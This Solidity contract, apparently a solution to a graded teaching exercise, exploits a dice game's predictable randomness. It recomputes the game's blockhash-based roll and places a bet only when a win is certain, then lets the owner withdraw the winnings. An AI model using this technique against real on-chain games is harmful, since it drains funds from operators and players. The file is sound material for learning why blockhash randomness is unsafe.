pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Insufficient balance");
        (bool sent, ) = _addr.call{ value: _amount }("");
        require(sent, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Insufficient balance to roll");
        
        // Get the current nonce from the DiceGame contract
        uint256 currentNonce = diceGame.nonce();
        
        // Predict the roll using the same algorithm as DiceGame
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), currentNonce));
        uint256 predictedRoll = uint256(hash) % 16;
        
        console.log("\t", "   Rigged Roll Prediction:", predictedRoll);
        
        // Revert if not a winning roll
        if (predictedRoll > 5) {
            revert("Not a winning roll");
        }
        
        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
